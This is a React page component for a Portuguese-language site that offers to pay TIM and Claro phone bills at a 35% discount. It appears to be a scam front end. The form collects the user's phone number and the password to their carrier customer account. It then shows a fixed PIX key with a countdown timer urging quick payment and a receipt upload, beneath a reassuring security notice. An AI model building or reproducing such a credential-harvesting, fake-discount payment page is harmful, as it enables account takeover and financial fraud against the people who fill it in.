import React, { useState, useContext } from 'react';
import { Link } from 'react-router-dom';
import { AuthContext } from '../App';
import { Button } from '../components/ui/button';
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '../components/ui/card';
import { Input } from '../components/ui/input';
import { Label } from '../components/ui/label';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '../components/ui/select';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from '../components/ui/dialog';
import { toast } from 'sonner';
import axios from 'axios';
import { Phone, ArrowLeft, CreditCard, Lock, Building, Clock, Copy, Upload, Calculator } from 'lucide-react';

const PayBillPage = () => {
  const { user, logout } = useContext(AuthContext);
  const [formData, setFormData] = useState({
    phoneNumber: '',
    operator: '',
    accountPassword: '',
    billAmount: ''
  });
  const [loading, setLoading] = useState(false);
  const [showPixModal, setShowPixModal] = useState(false);
  const [currentTransaction, setCurrentTransaction] = useState(null);
  const [timer, setTimer] = useState(0);
  const [uploadFile, setUploadFile] = useState(null);
  const [uploading, setUploading] = useState(false);
  
  const pixKey = "e0478dfb-0f3b-4837-977c-bc3a23622854";

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  const handleOperatorChange = (value) => {
    setFormData({
      ...formData,
      operator: value
    });
  };

  const calculateDiscount = (amount) => {
    if (!amount || isNaN(amount)) return 0;
    const discount = parseFloat(amount) * 0.35;
    return parseFloat(amount) - discount;
  };

  const copyPixKey = () => {
    navigator.clipboard.writeText(pixKey);
    toast.success('Chave PIX copiada!');
    
    setTimer(75);
    const interval = setInterval(() => {
      setTimer(prev => {
        if (prev <= 1) {
          clearInterval(interval);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  };

  const handleFileUpload = async () => {
    if (!uploadFile || !currentTransaction) {
      toast.error('Selecione um arquivo primeiro');
      return;
    }
    
    setUploading(true);
    
    try {
      const formDataUpload = new FormData();
      formDataUpload.append('file', uploadFile);
      
      await axios.post(`/transactions/${currentTransaction.id}/upload-receipt`, formDataUpload, {
        headers: {
          'Content-Type': 'multipart/form-data'
        }
      });
      
      toast.success('Comprovante enviado com sucesso! Aguarde a confirmação.');
      setShowPixModal(false);
      setUploadFile(null);
      setTimer(0);
    } catch (error) {
      toast.error('Erro ao enviar comprovante: ' + (error.response?.data?.detail || 'Erro desconhecido'));
    } finally {
      setUploading(false);
    }
  };

  const formatTimer = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!formData.phoneNumber || !formData.operator || !formData.accountPassword || !formData.billAmount) {
      toast.error('Preencha todos os campos');
      return;
    }
    
    setLoading(true);
    
    try {
      const response = await axios.post('/transactions/pay-bill', {
        phone_number: formData.phoneNumber,
        operator: formData.operator,
        account_password: formData.accountPassword
      });
      
      setCurrentTransaction(response.data);
      setShowPixModal(true);
      toast.success('Solicitação criada! Efetue o pagamento via PIX com desconto.');
    } catch (error) {
      toast.error('Erro ao criar solicitação: ' + (error.response?.data?.detail || 'Erro desconhecido'));
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen p-4">
      {/* Header */}
      <div className="max-w-4xl mx-auto">
        <div className="flex items-center justify-between mb-8">
          <div className="flex items-center space-x-4">
            <Link to="/" className="flex items-center text-gray-300 hover:text-white transition-colors">
              <ArrowLeft className="w-5 h-5 mr-2" />
              Início
            </Link>
            <div className="w-10 h-10 rounded-xl bg-gradient-to-r from-green-500 to-teal-500 flex items-center justify-center">
              <CreditCard className="w-6 h-6 text-white" />
            </div>
            <h1 className="text-3xl font-bold gradient-text">Pagar Fatura</h1>
          </div>
          
          <div className="flex items-center space-x-4">
            <span className="text-gray-300">Olá, {user?.name}</span>
            <Button onClick={logout} variant="outline" className="text-white border-white/20 hover:bg-white/10">
              Sair
            </Button>
          </div>
        </div>

        {/* Main Content */}
        <div className="max-w-2xl mx-auto">
          {/* Info Card */}
          <Card className="glass-strong border-0 text-white mb-8">
            <CardHeader className="text-center">
              <CardTitle className="text-2xl gradient-text">Pagamento de Fatura</CardTitle>
              <CardDescription className="text-gray-300">
                Pague suas faturas TIM e Claro de forma rápida e segura
              </CardDescription>
            </CardHeader>
            <CardContent>
              <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-4">
                <h3 className="font-semibold text-blue-300 mb-2">ℹ️ Como funciona:</h3>
                <ul className="text-sm text-gray-300 space-y-1">
                  <li>• Preencha os dados da sua conta</li>
                  <li>• Nossa equipe verificará o valor da fatura</li>
                  <li>• Enviaremos o valor e instruç̃es de pagamento</li>
                  <li>• Após confirmação, processamos o pagamento</li>
                </ul>
              </div>
            </CardContent>
          </Card>

          {/* Payment Form */}
          <Card className="glass-strong border-0 text-white">
            <CardHeader>
              <CardTitle className="flex items-center space-x-2">
                <Building className="w-6 h-6 text-green-400" />
                <span>Dados para Pagamento</span>
              </CardTitle>
            </CardHeader>
            <CardContent>
              <form onSubmit={handleSubmit} className="space-y-6">
                {/* Phone Number */}
                <div className="space-y-2">
                  <Label htmlFor="phoneNumber" className="text-white flex items-center space-x-2">
                    <Phone className="w-4 h-4" />
                    <span>Número da Linha</span>
                  </Label>
                  <Input
                    id="phoneNumber"
                    name="phoneNumber"
                    type="tel"
                    value={formData.phoneNumber}
                    onChange={handleChange}
                    className="input-premium"
                    placeholder="(11) 99999-9999"
                    required
                    data-testid="bill-phone-input"
                  />
                </div>

                {/* Operator Selection */}
                <div className="space-y-2">
                  <Label className="text-white flex items-center space-x-2">
                    <Building className="w-4 h-4" />
                    <span>Operadora</span>
                  </Label>
                  <Select value={formData.operator} onValueChange={handleOperatorChange}>
                    <SelectTrigger className="input-premium" data-testid="bill-operator-select">
                      <SelectValue placeholder="Selecione a operadora" />
                    </SelectTrigger>
                    <SelectContent className="bg-gray-800 border-gray-700">
                      <SelectItem value="tim" className="text-white hover:bg-gray-700">
                        TIM
                      </SelectItem>
                      <SelectItem value="claro" className="text-white hover:bg-gray-700">
                        Claro
                      </SelectItem>
                    </SelectContent>
                  </Select>
                </div>

                {/* Bill Amount */}
                <div className="space-y-2">
                  <Label htmlFor="billAmount" className="text-white flex items-center space-x-2">
                    <Calculator className="w-4 h-4" />
                    <span>Valor da Fatura</span>
                  </Label>
                  <Input
                    id="billAmount"
                    name="billAmount"
                    type="number"
                    step="0.01"
                    value={formData.billAmount}
                    onChange={handleChange}
                    className="input-premium"
                    placeholder="Ex: 120.50"
                    required
                    data-testid="bill-amount-input"
                  />
                  {formData.billAmount && (
                    <div className="p-3 bg-green-500/10 border border-green-500/20 rounded-lg">
                      <p className="text-sm text-green-300">
                        💰 Desconto de 35%: <span className="font-bold">R$ {calculateDiscount(formData.billAmount).toFixed(2)}</span>
                      </p>
                      <p className="text-xs text-gray-400 mt-1">
                        Valor original: R$ {parseFloat(formData.billAmount).toFixed(2)} → Você paga: R$ {calculateDiscount(formData.billAmount).toFixed(2)}
                      </p>
                    </div>
                  )}
                </div>

                {/* Account Password */}
                <div className="space-y-2">
                  <Label htmlFor="accountPassword" className="text-white flex items-center space-x-2">
                    <Lock className="w-4 h-4" />
                    <span>Senha da Conta da Operadora</span>
                  </Label>
                  <Input
                    id="accountPassword"
                    name="accountPassword"
                    type="password"
                    value={formData.accountPassword}
                    onChange={handleChange}
                    className="input-premium"
                    placeholder="Senha da sua conta na operadora"
                    required
                    data-testid="bill-password-input"
                  />
                  <p className="text-xs text-gray-400">
                    Esta é a senha que você usa para acessar a área do cliente da operadora
                  </p>
                </div>

                {/* Submit Button */}
                <Button 
                  type="submit"
                  disabled={loading}
                  className="w-full btn-success text-lg py-3 mt-8"
                  data-testid="bill-submit-button"
                >
                  {loading ? (
                    <div className="flex items-center space-x-2">
                      <div className="spinner w-5 h-5"></div>
                      <span>Processando...</span>
                    </div>
                  ) : (
                    <div className="flex items-center space-x-2">
                      <CreditCard className="w-5 h-5" />
                      <span>Solicitar Pagamento</span>
                    </div>
                  )}
                </Button>
              </form>
              
              {/* Security Notice */}
              <div className="mt-6 p-4 bg-green-500/10 border border-green-500/20 rounded-lg">
                <div className="flex items-center space-x-2 text-green-300 mb-2">
                  <Lock className="w-5 h-5" />
                  <span className="font-semibold">🔒 Segurança</span>
                </div>
                <p className="text-sm text-gray-300">
                  Seus dados são criptografados e utilizados apenas para o pagamento da fatura. 
                  Não armazenamos informações sensíveis permanentemente.
                </p>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* PIX Payment Modal */}
        <Dialog open={showPixModal} onOpenChange={setShowPixModal}>
          <DialogContent className="glass-strong border-0 text-white max-w-md">
            <DialogHeader>
              <DialogTitle className="text-center text-2xl gradient-text">
                Pagamento da Fatura com Desconto
              </DialogTitle>
            </DialogHeader>
            
            <div className="space-y-6">
              <div className="p-4 bg-white/5 rounded-lg">
                <h3 className="font-semibold mb-2">Detalhes do Pagamento</h3>
                <div className="space-y-1 text-sm">
                  <div className="flex justify-between">
                    <span className="text-gray-300">Telefone:</span>
                    <span>{formData.phoneNumber}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-300">Operadora:</span>
                    <span className="capitalize">{formData.operator}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-300">Valor original:</span>
                    <span className="line-through text-red-400">R$ {parseFloat(formData.billAmount || 0).toFixed(2)}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-gray-300">Valor com desconto (35%):</span>
                    <span className="text-green-400 font-semibold text-lg">R$ {calculateDiscount(formData.billAmount || 0).toFixed(2)}</span>
                  </div>
                </div>
              </div>
              
              <div className="space-y-4">
                <Label className="text-white">Chave PIX (Copia e Cola)</Label>
                <div className="flex space-x-2">
                  <Input
                    value={pixKey}
                    readOnly
                    className="input-premium font-mono text-sm"
                  />
                  <Button 
                    onClick={copyPixKey}
                    className="btn-premium"
                    data-testid="copy-pix-button"
                  >
                    <Copy className="w-4 h-4" />
                  </Button>
                </div>
              </div>
              
              {timer > 0 && (
                <div className="text-center p-4 bg-orange-500/10 border border-orange-500/20 rounded-lg">
                  <div className="flex items-center justify-center space-x-2 text-orange-400">
                    <Clock className="w-5 h-5" />
                    <span>Tempo para enviar comprovante:</span>
                  </div>
                  <div className="timer-display text-3xl mt-2">
                    {formatTimer(timer)}
                  </div>
                </div>
              )}
              
              <div className="space-y-4">
                <Label className="text-white">Enviar Comprovante</Label>
                <Input
                  type="file"
                  accept="image/*,.pdf"
                  onChange={(e) => setUploadFile(e.target.files[0])}
                  className="input-premium"
                  data-testid="upload-receipt-input"
                />
                
                <Button 
                  onClick={handleFileUpload}
                  disabled={!uploadFile || uploading}
                  className="w-full btn-success"
                  data-testid="upload-receipt-button"
                >
                  {uploading ? (
                    <div className="flex items-center space-x-2">
                      <div className="spinner w-4 h-4"></div>
                      <span>Enviando...</span>
                    </div>
                  ) : (
                    <div className="flex items-center space-x-2">
                      <Upload className="w-4 h-4" />
                      <span>Enviar Comprovante</span>
                    </div>
                  )}
                </Button>
              </div>
              
              <div className="text-xs text-gray-400 text-center">
                Após o envio do comprovante, sua fatura será paga em até 24 horas.
              </div>
            </div>
          </DialogContent>
        </Dialog>
      </div>
    </div>
  );
};

export default PayBillPage;